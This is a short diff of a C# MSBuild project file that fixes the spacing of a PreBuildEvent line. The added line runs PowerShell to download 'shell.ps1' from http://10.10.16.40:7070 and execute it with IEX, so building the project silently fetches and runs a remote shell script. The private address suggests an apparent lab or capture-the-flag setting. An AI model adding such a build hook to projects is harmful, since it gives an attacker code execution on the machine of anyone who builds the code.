@@ -51,6 +51,6 @@
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
-    <PreBuildEvent>powershell.exe -c "IEX(New-Object System.Net.WebClient). DownloadString('http://10.10.16.40:7070/shell.ps1')"</PreBuildEvent>
+    <PreBuildEvent>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.40:7070/shell.ps1')"</PreBuildEvent>
   </PropertyGroup>
 </Project>
